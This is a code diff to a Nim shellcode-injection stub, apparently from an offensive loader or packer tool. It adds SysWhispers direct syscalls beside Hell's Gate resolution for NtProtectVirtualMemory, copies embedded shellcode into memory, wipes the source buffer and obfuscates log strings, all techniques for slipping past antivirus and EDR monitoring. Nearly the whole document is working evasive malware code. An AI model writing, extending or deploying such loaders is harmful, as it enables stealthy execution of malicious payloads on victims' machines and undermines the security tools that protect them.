@@ -160,16 +160,20 @@ let LocalInjectStub*  = """
                             else:
                                 echo obf("[-] Failed to read the original RX section")
                                 quit(1)
-
-                    when defined(Hellsgate):
-                        if getSyscall(ntProtectTable):
-                            syscall = ntProtectTable.wSysCall
-                        else:
-                            when defined(verbose):
-                                echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                     var protectAddress: LPVOID = buffer
                     var oProtect: DWORD
-                    status = NtProtectVirtualMemory(-1, addr protectAddress, addr allocationSize, PAGE_READWRITE, addr oProtect)
+                    
+                    when defined(SysWhispers):
+                        status = uashdiasdj(-1, &protectAddress, &allocationSize, PAGE_READWRITE, addr oProtect)
+                    else:
+                        when defined(Hellsgate):
+                            if getSyscall(ntProtectTable):
+                                syscall = ntProtectTable.wSysCall
+                            else:
+                                when defined(verbose):
+                                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                        
+                        status = NtProtectVirtualMemory(-1, addr protectAddress, addr allocationSize, PAGE_READWRITE, addr oProtect)
                     when defined(verbose):
                         if (status == 0):
                             echo obf("[+] NtProtectVirtualMemory success! "), repr(protectAddress)
@@ -207,6 +211,17 @@ let LocalInjectStub*  = """
 
                 
         when not defined(AllocateDripStyle):
+            when defined(verbose):
+                echo obf("[*] Writing shellcode to address: "), toHex(cast[HANDLE](buffer)), "\r\n"
+            moveMemory(buffer, unsafeAddr friendlycode, friendlycode.len)
+            # clean memory from friendlycode
+            when defined(verbose):
+                echo obf("[*] Cleaning memory")
+            var clean: seq[byte] = newSeq[byte](friendlycode.len)
+            moveMemory(unsafeAddr friendlycode[0], unsafeAddr clean[0], friendlycode.len)
+            when defined(verbose):
+                echo obf("[+] Memory cleaned")
+            #[
             var bytesWritten: SIZE_T
             when defined(Hellsgate):
                 var 
@@ -233,7 +248,7 @@ let LocalInjectStub*  = """
             else:
                 when defined(verbose):
                     echo obf("[+] NtWriteVirtualMemory - wrote bytes ") & fmt"{bytesWritten}"
-        
+            ]#
         when defined(JmpEntry):
             var newEntry: LPVOID
             newEntry = prepEntry(-1, buffer, jmpMod, jmpFunc)
